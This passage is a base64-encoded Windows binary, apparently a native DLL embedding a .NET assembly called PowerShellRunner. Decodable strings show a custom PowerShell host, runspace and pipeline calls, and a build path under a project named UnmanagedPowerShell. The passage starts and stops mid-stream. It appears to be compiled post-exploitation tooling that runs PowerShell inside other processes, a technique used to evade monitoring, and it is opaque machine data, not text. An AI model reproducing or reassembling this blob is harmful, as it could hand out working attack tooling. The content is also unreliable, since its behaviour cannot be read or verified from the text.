AGRlc2NyaXB0aW9ucwBjaG9pY2VzAGRlZmF1bHRDaG9pY2UAdXNlck5hbWUAdGFyZ2V0TmFtZQBhbGxvd2VkQ3JlZGVudGlhbFR5cGVzAG9wdGlvbnMAcmVjdGFuZ2xlAHNvdXJjZQBkZXN0aW5hdGlvbgBjbGlwAGZpbGwAb3JpZ2luAGNvbnRlbnRzAFN5c3RlbS5SZWZsZWN0aW9uAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBBc3NlbWJseUN1bHR1cmVBdHRyaWJ1dGUAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAENvbVZpc2libGVBdHRyaWJ1dGUAR3VpZEF0dHJpYnV0ZQBBc3NlbWJseVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBTeXN0ZW0uRGlhZ25vc3RpY3MARGVidWdnYWJsZUF0dHJpYnV0ZQBEZWJ1Z2dpbmdNb2RlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5SdW5zcGFjZXMASW5pdGlhbFNlc3Npb25TdGF0ZQBDcmVhdGVEZWZhdWx0AEF1dGhvcml6YXRpb25NYW5hZ2VyAHNldF9BdXRob3JpemF0aW9uTWFuYWdlcgBSdW5zcGFjZUZhY3RvcnkAUnVuc3BhY2UAQ3JlYXRlUnVuc3BhY2UAT3BlbgBQaXBlbGluZQBDcmVhdGVQaXBlbGluZQBDb21tYW5kQ29sbGVjdGlvbgBnZXRfQ29tbWFuZHMAQWRkU2NyaXB0AENvbW1hbmQAZ2V0X0l0ZW0AUGlwZWxpbmVSZXN1bHRUeXBlcwBNZXJnZU15UmVzdWx0cwBBZGQASW52b2tlAElEaXNwb3NhYmxlAERpc3Bvc2UAU3lzdGVtLlRocmVhZGluZwBUaHJlYWQAZ2V0X0N1cnJlbnRUaHJlYWQATm90SW1wbGVtZW50ZWRFeGNlcHRpb24ATmV3R3VpZABBcHBlbmQAU3RyaW5nAENvbmNhdABBcHBlbmRMaW5lAFRvU3RyaW5nAHNldF9XaWR0aABzZXRfSGVpZ2h0AHNldF9YAHNldF9ZAAAAF28AdQB0AC0AZABlAGYAYQB1AGwAdAABGUMAdQBzAHQAbwBtAFAAUwBIAG8AcwB0AACBd0UAbgB0AGUAcgBOAGUAcwB0AGUAZABQAHIAbwBtAHAAdAAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABhAHMAawBpAG4AZwAgAGYAbwByACAAaQBuAHAAdQB0ACwAIAB3AGgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAYF1RQB4AGkAdABOAGUAcwB0AGUAZABQAHIAbwBtAHAAdAAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABhAHMAawBpAG4AZwAgAGYAbwByACAAaQBuAHAAdQB0ACwAIAB3AGgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAQMKAAAPRABFAEIAVQBHADoAIAAAD0UAUgBSAE8AUgA6ACAAABNWAEUAUgBCAE8AUwBFADoAIAAAE1cAQQBSAE4ASQBOAEcAOgAgAACBYVAAcgBvAG0AcAB0ACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAgACAAVABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAcwBrAGkAbgBnACAAZgBvAHIAIABpAG4AcAB1AHQALAAgAHcAaABpAGMAaAAgAGkAcwAgAGEAIABwAHIAbwBiAGwAZQBtACAAcwBpAG4AYwBlACAAdABoAGUAcgBlACcAcwAgAG4AbwAgAGMAbwBuAHMAbwBsAGUALgAgACAATQBhAGsAZQAgAHMAdQByAGUAIAB0AGgAZQAgAHMAYwByAGkAcAB0ACAAYwBhAG4AIABlAHgAZQBjAHUAdABlACAAdwBpAHQAaABvAHUAdAAgAHAAcgBvAG0AcAB0AGkAbgBnACAAdABoAGUAIAB1AHMAZQByACAAZgBvAHIAIABpAG4AcAB1AHQALgABgXNQAHIAbwBtAHAAdABGAG8AcgBDAGgAbwBpAGMAZQAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABhAHMAawBpAG4AZwAgAGYAbwByACAAaQBuAHAAdQB0ACwAIAB3AGgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAYF9UAByAG8AbQBwAHQARgBvAHIAQwByAGUAZABlAG4AdABpAGEAbAAxACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAgACAAVABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAcwBrAGkAbgBnACAAZgBvAHIAIABpAG4AcAB1AHQALAAgAHcAaABpAGMAaAAgAGkAcwAgAGEAIABwAHIAbwBiAGwAZQBtACAAcwBpAG4AYwBlACAAdABoAGUAcgBlACcAcwAgAG4AbwAgAGMAbwBuAHMAbwBsAGUALgAgACAATQBhAGsAZQAgAHMAdQByAGUAIAB0AGgAZQAgAHMAYwByAGkAcAB0ACAAYwBhAG4AIABlAHgAZQBjAHUAdABlACAAdwBpAHQAaABvAHUAdAAgAHAAcgBvAG0AcAB0AGkAbgBnACAAdABoAGUAIAB1AHMAZQByACAAZgBvAHIAIABpAG4AcAB1AHQALgABgX1QAHIAbwBtAHAAdABGAG8AcgBDAHIAZQBkAGUAbgB0AGkAYQBsADIAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuACAAIABUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBzAGsAaQBuAGcAIABmAG8AcgAgAGkAbgBwAHUAdAAsACAAdwBoAGkAYwBoACAAaQBzACAAYQAgAHAAcgBvAGIAbABlAG0AIABzAGkAbgBjAGUAIAB0AGgAZQByAGUAJwBzACAAbgBvACAAYwBvAG4AcwBvAGwAZQAuACAAIABNAGEAawBlACAAcwB1AHIAZQAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABjAGEAbgAgAGUAeABlAGMAdQB0AGUAIAB3AGkAdABoAG8AdQB0ACAAcAByAG8AbQBwAHQAaQBuAGcAIAB0AGgAZQAgAHUAcwBlAHIAIABmAG8AcgAgAGkAbgBwAHUAdAAuAAGBZVIAZQBhAGQATABpAG4AZQAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABhAHMAawBpAG4AZwAgAGYAbwByACAAaQBuAHAAdQB0ACwAIAB3AGgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAYGBUgBlAGEAZABMAGkAbgBlAEEAcwBTAGUAYwB1AHIAZQBTAHQAcgBpAG4AZwAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABhAHMAawBpAG4AZwAgAGYAbwByACAAaQBuAHAAdQB0ACwAIAB3AGgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAUlGAGwAdQBzAGgASQBuAHAAdQB0AEIAdQBmAGYAZQByACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAAS0cAZQB0AEIAdQBmAGYAZQByAEMAbwBuAHQAZQBuAHQAcwAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AAEFLAGUAeQBBAHYAYQBpAGwAYQBiAGwAZQAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AAIFjUgBlAGEAZABLAGUAeQAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABl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iEAAAJ5AAACcfgEAoEAAAOZBAACofQEA6EEAAA5CAACcfgEAIEIAALZCAACcfgEAxEIAAA9DAACcfgEAEEMAAHBDAABogQEAcEMAAKlDAACofQEAxEMAAFlFAADYfgEAXEUAAHxFAAAQfAEAiEUAALVIAAAIfwEAuEgAACtJAACIfQEALEkAAB9KAABQfwEAIEoAAOdLAABgfwEA6EsAABlNAAB8fwEAHE0AAMhNAACQfwEAyE0AALxOAACcfwEAvE4AAClPAAC0fwEALE8AAJ1PAADAfwEAEFAAADtQAAAQfAEAPFAAAIhQAACcfgEAiFAAAIJUAACcfgEAjFQAAKtUAACcfgEArFQAAMxUAACcfgEAzFQAAEtVAADMfwEATFUAAMZVAADMfwEAyFUAAElWAADMfwEATFYAAIRWAACofQEAhFYAALxWAACofQEAxFYAAAdXAAAQfAEAOFcAAKdZAADkfwEAqFkAAAlaAACcfgEAIFoAAMhaAAAIgAEAyFoAAAxbAACofQEADFsAAJNbAABogQEAlFsAAFFcAAAMgAEAVFwAALVcAACIfQEA4FwAAEddAAA4gAEASF0AALRdAAA8gAEAtF0AANFdAAAQfAEA1F0AADdeAACcfgEAUF4AAHpgAABogAEAfGAAACRhAABsgAEAJGEAAHBhAACcfgEAcGEAAOlhAACIfQEA+GEAAN5iAACUgAEA4GIAAAZjAAAQfAEACGMAAGdjAAAQfAEA9GMAAIplAABogQEAMGYAAKVmAADUgAEAqGYAAApnAACofQEADGcAADRnAAAQfAEANGcAALFnAACYgQEAtGcAAEJoAABogQEARGgAACVqAAB8gQEAKGoAAOJqAAD0gAEA5GoAAChtAAAYgQEAKG0AANZvAABIgQEA2G8AABtwAACYgQEAHHAAAGFwAACYgQEAfHAAAG9yAACggQEAcHIAAMFzAAC8gQEAzHMAAAV0AACofQEAIHQAAER0AADYgQEAUHQAAGh0AADggQEAcHQAAHF0AADkgQEAgHQAAIF0AADogQEA4HQAAC11AADsgQEAYHUAAKN1AACcfgEApHUAAK52AAAQggEAsHYAAMd2AAAQfAEAyHYAAOh2AABgggEA6HYAAAd3AABAggEACHcAACV3AAAQfAEAYHcAAJN5AACAggEAnHkAABV6AACwggEALHoAAP96AACIfQEAAHsAAJp7AACofQEAnHsAACF8AACcfgEAJHwAAI98AACcfgEArHwAAOx8AAAQfAEA7HwAAF9/AADAggEAYH8AAASBAADcggEABIEAAH6BAACofQEAgIEAAOaBAADwggEA6IEAAL+CAAAUgwEAwIIAAKGDAAA8gwEApIMAAJWLAABogwEAmIsAAKKMAACMgwEApIwAABCNAACgfQEAEI0AAAqRAACMgwEADJEAAPiTAACkgwEA+JMAAI6UAACUgwEAkJQAAAaWAADcgwEACJYAAISWAADMgwEAhJYAAA+YAAAEhAEAEJgAAJqZAAAghAEAnJkAALCZAAAYhAEAsJkAAD2bAAAwhAEATJsAAIWbAAAQfAEAiJsAAN2bAAAQfAEA4JsAAGqcAADMfwEAbJwAAJ6cAAAQfAEAoJwAAC+dAABEhAEAoJ0AAAWjAABYhAEACKMAAMujAABchAEAzKMAAIakAACofQEAiKQAAL+kAACcfgEAwKQAAFilAACUhAEAWKUAAAKmAACEhAEABKYAAHimAAAQfAEApKYAAImnAADAhAEAjKcAAB+oAACIfQEAIKgAAHmoAACYfQEAkKgAAN6oAADwhAEA4KgAACepAAD4hAEAKKkAAHupAACcfgEAfKkAAJypAAAQfAEAnKkAANepAAAYhQEA2KkAALOqAAAghQEA0KoAAJerAAAwhQEAmKsAAGesAABIhQEAaKwAAC+tAAA0hQEA0K0AAIazAABchQEAiLMAAD65AABchQEAQLkAAKHBAACAhQEApMEAAMjBAAAYhQEAyMEAAEbCAAAYhAEASMIAAPjFAADghQEA+MUAAPHHAACshQEA9McAAOvIAADIhQEA7MgAAE3KAACcfwEAUMoAACHLAAD8hQEAJMsAAFjMAAAUhgEAYMwAAPbMAACYgQEAAM0AAEDNAACkhQEASM0AAMfNAACYgQEA3M0AAP7PAAAshgEAANAAAHrQAACYgQEAfNAAAM7RAABEhgEA8NEAADTTAABUhgEANNMAAP/TAACofQEAANQAAM3UAAB0hgEA0NQAAIfVAABchgEAiNUAAGDgAAB8hgEAcOAAAPPhAACghgEAAOIAAEDiAACcfgEAQOIAAH3iAACcfgEAgOIAANPiAACofQEA4OIAABTjAAAYhQEAIOMAAOnjAAAkhwEA7OMAABjlAABgfwEAGOUAAKzlAADUhgEArOUAAE3mAABMhwEAUOYAAKHmAAD8hgEApOYAAOfmAACcfgEA6OYAAEbnAACofQEASOcAAF3nAAAQfAEAYOcAAHXnAAAQfAEAeOcAAKrnAACcfgEArOcAAMfnAACcfgEAyOcAAOPnAACcfgEA5OcAAAXpAADohgEACOkAAI/pAAA8hwEAkOkAACXqAADMfwEAKOoAAJbqAABgiAEAmOoAALnqAACcfgEAzOoAAAXrAACofQEACOsAAMnrAAAEiAEAzOsAAIDwAADohwEAgPAAAOXyAABIiAEA6PIAAL/zAACAiAEA5PMAAJr0AAAciAEAnPQAAOv2AAC0iAEA7PYAAO/4AABghwEA8PgAAEP5AAAQfAEARPkAANb6AACshwEA2PoAAPz8AACciAEA/PwAACn+AADMfwEALP4AAFP+AAAQfAEAVP4AAH3+AACcfgEAjP4AAMf+AACofQEA0P4AAFz/AABogQEAgP8AAMD/AADoiAEAGAABAD8AAQBcgAEAPwABAGUAAQBcgAEAZQABAK4AAQBcgAEArgABAMcAAQBcgAEAxwABAOAAAQBcgAEA4AABAAQBAQBcgAEABAEBAB8BAQBcgAEAHwEBADwBAQBcgAEAPAEBAFUBAQBcgAEAVQEBAG4BAQBcgAEAbgEBAJYBAQBcgAEAlgEBAK8BAQBcgAEArwEBAMgBAQBcgAEAyAEBAOEBAQBcgAEA8AEBABACAQBcgAEAEAIBACQCAQBcgAEAJAIBAEICAQBcgAEAQgIBAFoCAQBcgAEAWgIBAHECAQBcgAEAcQIBAIgCAQBcgAEAiAIBAKECAQBcgAEAoQIBAOcCAQAchwEA5wIBANsDAQBcgAEA2wMBAFkEAQCghwEAWQQBAHEEAQBcgAEAcQQBAIcEAQBcgAEAhwQBALAEAQBcgAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA